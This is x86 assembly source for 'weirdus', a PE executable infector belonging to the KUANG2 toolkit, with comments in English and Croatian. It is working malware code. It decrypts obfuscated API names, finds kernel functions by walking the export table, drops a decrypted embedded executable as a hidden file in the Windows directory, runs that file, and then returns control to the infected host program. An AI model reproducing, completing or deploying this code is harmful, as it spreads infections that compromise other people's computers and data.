;***[ThuNderSoft]*************************************************************
;								KUANG2: weirdus
;								   ver: 0.21
;								úùÄÍ WEIRD ÍÄùú
;*****************************************************************************

;* HISTORY *
; ver 0.21 (18-may-1999): jo„ smanjenja (cmpname)
; ver 0.20 (08-mar-1999): standardni oblik radi
; ver 0.10 (29-jan-1999): born code

.387
.386p

;**	  weirdus
;**	  -------
;** > this is virus code that is added to PE EXE files
;** > All is in DATA segment so we can easily access from Watcoma.
;**   Could be in CODE seg. too, but than we should use PEWRSEC
;**   and result is the same
;** > Note: all has to be done via offsets
;** > Becouse of assembler bug there is error in 'mov eax, [ebp + ofs1 - ofs2'
;**   so I do not use it
;** > Size: 999 bytes


include weirdus.inc


_DATA segment dword public use32 'DATA'
assume ds:_DATA, ss:_DATA

PUBLIC _virus_start, _virus_end
PUBLIC _oldEntryPoint, _oldEntryPointRVA, _oldEPoffs, _oldfilesize
PUBLIC _oldoffs1, _olddata1, _oldoffs2, _olddata2, _oldoffs3, _olddata3, _oldoffs4, _olddata4, _oldoffs5, _olddata5
PUBLIC _ddGetModuleHandleA, _ddGetProcAddress
PUBLIC _addfile_size, _kript


;*****************
;*** Code part ***
;*****************

_virus_start:
		push eax				; save return address to the host
		pushad
		call letsgo

letsgo:
		pop ebp					; get IP (instruction pointer) from call
		add ebp, _data_start - letsgo	; ebp points to data (_data_start)

x = _OldEntryPoint - _data_start
		mov eax, cs:[ebp+x]		; get host EntryPoint
		mov [esp+32], eax		; push oldEntrypoint hosta in stack


;**********************
;*** Inicialization ***
;**********************

;first decrypt function strings
x = strKernel - _data_start
		lea eax, [ebp+x]
@@:		cmp byte ptr [eax], 0
		je @f					; if end, jump
		dec byte ptr [eax]
		inc eax
		jmp @b					; looping
@@:

; esi = GetModuleHandleA(KERNEL32.DLL)
x = strKernel - _data_start
		lea eax, [ebp + x]
		push eax				; Arg0 = LPCTSTR lpModuleName
x = _ddGetModuleHandleA - _data_start
		mov eax, cs:[ebp + x]
		call dword ptr [eax]	; call GetModuleHandleA
		test eax, eax
		jz virus_exit			; if error, jump
		mov esi, eax			; esi = HMODULE (KERNEL32.DLL)


; GetProcAddress
x = _ddGetProcAddress - _data_start
		mov eax, cs:[ebp+x]		; check if GetProcAddress is imported
		test eax, eax			; in this exe file
		jnz @f					; yes, all ok, go on
								; no, lets find it

; find GetProcAddress address if can
x = strGetProcAddress - _data_start
		lea eax, cs:[ebp+x]
		push eax				; Arg1 = LPCSTR lpProcName
		push esi				; Arg0 = hModule (KERNEL32.DLL)
		call near ptr WinGetProcAddress
		test eax, eax			; found?
		jz virus_exit			; not, jump
x = ddGetProcAddress - _data_start
		lea ebx, cs:[ebp+x]
		mov [ebx], eax			; store function address
		mov [ebx-4], ebx		; and pointer to address


;***************************
;*** Find WinAPI address ***
;***************************
; for small code size, we must use this function order!

@@:
; GetProcAddress (GetWindowsDirectoryA)
x = strGetWindowsDirectoryA - _data_start
		lea eax, cs:[ebp+x]
		call near ptr MyGetProcAddress
x = ddGetWindowsDirectoryA - _data_start
		lea edi, cs:[ebp+x]
		mov [edi], eax			; store function address

; GetProcAddress (GetComputerNameA)
x = strGetComputerNameA - _data_start
		lea eax, cs:[ebp+x]
		call near ptr MyGetProcAddress
		mov [edi+4], eax		; store function address

; GetProcAddress (CreateFileA)
x = strCreateFileA - _data_start
		lea eax, cs:[ebp+x]
		call near ptr MyGetProcAddress
		mov [edi+8], eax		; store function address

; GetProcAddress (WriteFile)
x = strWriteFile - _data_start
		lea eax, cs:[ebp+x]
		call near ptr MyGetProcAddress
		mov [edi+12], eax		; store function address

; GetProcAddress (CloseHandle)
x = strCloseHandle - _data_start
		lea eax, cs:[ebp+x]
		call near ptr MyGetProcAddress
		mov [edi+16], eax		; store function address

; GetProcAddress (CreateProcessA)
x = strCreateProcessA - _data_start
		lea eax, cs:[ebp+x]
		call near ptr MyGetProcAddress
		mov [edi+20], eax		; store function address


;*******************
;*** Strings etc ***
;*******************

; GetWindowsDirectoryA
		push dword ptr 256		; Arg1 = UINT Size
x = filename - _data_start
		lea eax, cs:[ebp+x]
		push eax				; Arg0 = LPTSTR lpBuffer
		call dword ptr [edi]	; call GetWindowsDirectoryA

; GetComputerNameA
x = cmpname_len - _data_start
		lea eax, cs:[ebp+x]
		push eax				; Arg1 = LPDWORD nSize
x = cmpname - _data_start
		lea eax, cs:[ebp+x]
		push eax				; Arg0 = LPTSTR lpBuffer
		call dword ptr [edi+4]	; call GetComputerNameA

; create unique file name into filename
; it is nice cause ComputerName have only file-valid chars
x = cmpname - _data_start
		lea edx, cs:[ebp+x]		; edx -> cmpname
x = filename - _data_start
		lea eax, cs:[ebp+x]		; eax -> filename
@@:		cmp byte ptr [eax], 0
		je @f
		inc eax
		jmp @b
@@:		mov byte ptr [eax], '\' ; add '\' on filename end
		inc eax

@@:		mov cl, byte ptr [edx]
		cmp cl, 0
		je @f
		mov ch, cl
		sub ch, 'A'
		cmp ch, 25
		ja temp1				; if not capital go on
		add cl, 32				; change capital to lower
temp1:	mov ch, cl
		sub ch, 'a'
		cmp ch, 25
		ja nextchar				; if not a letter than write it
		dec cl					; if a letter take previous (HAL & IBM:)
		cmp cl, 'a'-1           ; is it 'a'?
		jne nextchar			; not
		mov cl, 'z'             ; yes, do wrapping
nextchar:
		mov byte ptr [eax], cl
		inc eax
		inc edx
		jmp @b
@@:

; add '.exe' extension
		mov dword ptr [eax], 6578652Eh
		mov byte ptr [eax+4], 0 ; close string


;****************************************************************
;*** Create file if there is no one, write virus and close it ***
;****************************************************************

; create file
		xor edx, edx			; edx = NULL
		push edx						; Arg6 = hTemplateFile
		push dword ptr FILE_ATTRIBUTE_HIDDEN+FILE_ATTRIBUTE_ARCHIVE		; Arg5 = dwFlagsAndAttributes
		push dword ptr CREATE_NEW		; Arg4 = dwCreationDistribution
		push edx						; Arg3 = lpSecurityAttributes
		push edx						; Arg2 = dwShareMode
		push dword ptr GENERIC_WRITE	; Arg1 = dwDesiredAccess
x = filename - _data_start
		lea eax, cs:[ebp+x]		; eax -> filename
		push eax				; Arg0 = lpFileName
		call dword ptr [edi+8]	; call CreateFileA
		cmp dword ptr eax, INVALID_HANDLE_VALUE
		je virus_start			; error, or file already exist

		mov edx, eax			; no error, store file handle
		push eax				; and push it on the stack for later (CloseHandle)

; Decrypt file and write it
		xor ecx, ecx
		push ecx				; Arg4 = lpOverlapped
x = temp - _data_start
		lea eax, cs:[ebp+x]		; eax -> temp
		push eax				; Arg3 = lpNumberOfBytesWritten
x = _addfile_size- _data_start
		lea eax, cs:[ebp+x]
		mov ecx, [eax]
		push ecx				; Arg2 = nNumberOfBytesToWrite
		add eax, 4
		push eax				; Arg1 = lpBuffer
		push edx				; Arg0 = handle
; decrypt
x = _kript - _data_start
		mov bl, cs:[ebp+x]
@@:		add [eax], bl
		inc eax
		add bl, 173
		dec ecx
		jnz @b
; write
		call dword ptr [edi+12] ; call WriteFile

; close created file
;		push edx				; Arg0 = handle (bilo ranije!)
		call dword ptr [edi+16] ; call CloseHandle


;***************************
;*** Starts created file ***
;***************************

;CreateProcess(proginame, NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, (LPTSTR)NULL, &si, &pi))
virus_start:
		xor edx, edx
x = process_information - _data_start
		lea eax, cs:[ebp+x]
		push eax				; Arg9 = lpProcessInformation
x = startup_info - _data_start
		lea eax, cs:[ebp+x]
		push eax				; Arg8 = lpStartupInfo
; pripare startupinfo
		mov cl, 67
@@:		inc eax
		mov [eax], dl
		dec cl
		jnz @b
		mov byte ptr [eax-20], 80h		; STARTF_FORCEOFFFEEDBACK
;rest
		push edx				; Arg7 = lpCurrentDirectory
		push edx				; Arg6 = lpEnvironment
		push dword ptr NORMAL_PRIORITY_CLASS		; Arg5 = dwCreationFlags
		push edx				; Arg4 = bInheritHandles
		push edx				; Arg3 = lpThreadAttributes
		push edx				; Arg2 = lpProcessAttributes
		push edx				; Arg1 = lpCommandLine
x = filename - _data_start
		lea eax, cs:[ebp+x]
		push eax				; Arg0 = lpApplicationName
		call dword ptr [edi+20] ; call CreateProcessA


;********************************
;*** Go out and run the host ***
;*******************************
virus_exit:
		popad
		ret						; wuzz back to the host


;************************
;*** MyGetProcAddress ***
;************************
; get address of WinAPI functions from KERNEL32.DLL
; in: eax -> function filename 
;	  esi = hmodule(kernel32.dll)
; out: eax = function address
MyGetProcAddress:
		push eax				; Arg1 = LPCSTR lpProcName
		push esi				; Arg0 = hModule (KERNEL32.DLL)
x = _ddGetProcAddress - _data_start
		mov edx, cs:[ebp+x]
		call dword ptr [edx]	; call GetProcAddress
		test eax, eax			; function found?
		jz virus_exit			; no, jump
		retn



;*************************
;*** WinGetProcAddress ***
;*************************
; If GetProcAddress is not imported, this function can be used
; for getting that address. Also it can retrieve all addresses, 
; but lets Windows do it.
; So, it is modified a bit for getting just GetProcAdress.

WinGetProcAddress:
		push ebx
		push esi
		push edi

; get hModule
		mov edx, [esp+16]

; check handle
		sub eax, eax
;		cmp word ptr [edx], 'ZM'
;		jnz @@gpaExit
		mov edx, [edx+60]
		add edx, [esp+16]
;		cmp dword ptr [edx], 'EP'
;		jnz @@gpaExit

; handle is valid
		mov edx, [edx+78h]
		add edx, [esp+16]

; EDX points at .edata start
; [edx+12] -> module name	 RVA
; [edx+16] =  ordinal base
; [edx+20] =  number of addresses
; [edx+24] =  number of names
; [edx+28] -> array of n address RVA
; [edx+32] -> array of n names*	 RVA
		mov ecx, [edx+24]
		jecxz @@gpaExit

; Run trought all strings until we find same or until the end
		mov edi, [edx+32]
		add edi, [esp+16]

@@gpaLoop:
;		mov ebx, [edi-4]
		mov ebx, [edi]
		add edi, 4
		add ebx, [esp+16]
		mov esi, [esp+20]

@@gpaCmpStr:
		mov al, [ebx]
		mov ah, [esi]
		or ah, al
		jz short @@gpaOrdinalFound

		cmp al, [esi]
		jne short @@gpaCheckNext

		inc esi
		inc ebx
		jmp short @@gpaCmpStr

@@gpaCheckNext:
		loop short @@gpaLoop

; string not found, error me
		sub eax, eax
		jmp short @@gpaExit

@@gpaOrdinalFound:
; found! -  (numNames - ECX) is function ordinal
		mov eax, [edx+24]
		sub eax, ecx
		mov ecx, [edx+24h]
		add ecx, [esp+16]
		movzx eax, word ptr [eax*2+ecx]
		mov eax, [edx+eax*4+28h]
		add eax, [esp+16]

@@gpaExit:
		pop edi
		pop esi
		pop ebx
		retn 8




;*****************
;*** Data part ***
;*****************
; here goes data... some data is overlapped to make the code smaller

_data_start:
;*** Global data ***
_oldEntryPoint			dd	?
_oldEntryPointRVA		dd	?
_oldEPoffs				dd	?
_oldfilesize			dd	?
_oldoffs1				dd	?	; size of last section (SizeOfRawData)
_olddata1				dd	?
_oldoffs2				dd	?	; size of lastsection from DirectoryData (if exist!)
_olddata2				dd	?
_oldoffs3				dd	?	; last section characteristics
_olddata3				dd	?
_oldoffs4				dd	?	; size of last section (VirtualSize)
_olddata4				dd	?
_oldoffs5				dd	?	; SizeofImage
_olddata5				dd	?
_kript					db	?

;*** Local data ***

; strings: 116 bytes total
strKernel				db 'W' ;db 4Ch                          ; "K"
process_information		db 46h, 53h, 4Fh, 46h, 4Dh, 34h
cmpname					db 33h, 2Fh, 45h, 4Dh, 4Dh, 1	; "ERNEL32.DLL", 0  
strGetWindowsDirectoryA db 48h, 66h, 75h, 58h, 6Ah, 6Fh
						db 65h, 70h, 78h, 74h
startup_info			db 45h, 6Ah, 73h, 66h			
						db 64h, 75h, 70h, 73h
						db 7Ah, 42h, 1					; "GetWindowsDirectoryA", 0
strGetComputerNameA		db 48h, 66h, 75h, 44h, 70h, 6Eh
						db 71h, 76h, 75h, 66h, 73h, 4Fh
						db 62h, 6Eh, 66h, 42h, 1		; "GetComputerNameA", 0
strCreateFileA			db 44h							; "C"
temp					db 73h, 66h, 62h, 75h, 66h, 47h
						db 6Ah, 6Dh, 66h, 42h, 1		; "reateFileA", 0  
strWriteFile			db 58h, 73h, 6Ah, 75h, 66h, 47h
						db 6Ah, 6Dh, 66h, 1				; "WriteFile", 0
strCloseHandle			db 44h, 6Dh, 70h, 74h, 66h, 49h
						db 62h, 6Fh, 65h, 6Dh, 66h, 1	; "CloseHandle", 0
strCreateProcessA		db 44h, 73h, 66h, 62h, 75h, 66h
						db 51h, 73h, 70h, 64h, 66h, 74h
						db 74h, 42h, 1					; "CreateProcessA", 0
strGetProcAddress		db 48h, 66h, 75h, 51h, 73h, 70h
						db 64h, 42h, 65h, 65h, 73h, 66h
						db 74h, 74h, 0					; "GetProcAddress", 0

filename				db MAX_PATH dup(0), 0
;cmpname					db MAX_COMPUTERNAME_LENGTH dup(0), 0
cmpname_len				dd MAX_COMPUTERNAME_LENGTH+1

;*** WinAPI functions pointer ***
; Do not change data order - code needs to be small!
_ddGetModuleHandleA		dd	?
_ddGetProcAddress		dd	?
ddGetProcAddress		dd	?
ddGetWindowsDirectoryA	dd	?		; <- edi
ddGetComputerNameA		dd	?
ddCreateFileA			dd	?
ddWriteFile				dd	?
ddCloseHandle			dd	?
ddCreateProcessA		dd	?

;*** Here goes EXE file ***
_addfile_size			dd ?	; size of added exe file
;_virus_data					; here goes added exe file

_virus_end:						; at last... virus end
_DATA ends

end
